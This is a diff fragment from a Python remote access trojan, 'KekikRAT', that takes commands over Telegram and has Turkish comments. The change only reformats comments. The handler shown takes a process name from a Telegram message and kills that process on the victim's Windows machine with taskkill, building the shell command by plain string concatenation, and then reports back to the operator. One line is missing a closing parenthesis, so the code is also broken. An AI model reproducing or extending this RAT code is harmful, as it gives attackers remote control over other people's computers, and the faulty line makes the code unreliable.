@@ -128,12 +128,12 @@ def url_ac(message):
 # / Islem_Sonlandir Komutu ######################################################################################
 @KekikRAT.message_handler(commands=["islem_sonlandir", "Islem_Sonlandir"]) # islem_sonlandir Komutunu bekliyorum
 def islem_sonlandir(message):
-    try: # Çalıştırmayı Dene (Hata ile karşılaşıldığında betik kapanmasın diye..)
+    try:                            # Çalıştırmayı Dene (Hata ile karşılaşıldığında betik kapanmasın diye..)
         gelen_mesaj = "{0}".format(message.text)                        # Gelen Mesajı içeren değişken
         subprocess.call("taskkill /IM " + gelen_mesaj.split(" ")[1])    # Süreci adıyla öldür
         KekikRAT.send_chat_action(chat_id, 'typing'                     # Yazıyor Aksiyonu
         KekikRAT.send_message(chat_id, "Hallettim!")                    # Mesaj gönder
-    except: # Hata varsa
+    except:                                                             # Hata varsa
         KekikRAT.send_chat_action(chat_id, 'typing')                    # Yazıyor Aksiyonu
         KekikRAT.send_message(chat_id, "Kapatılamadı!")
 # / Islem_Sonlandir Komutu ######################################################################################
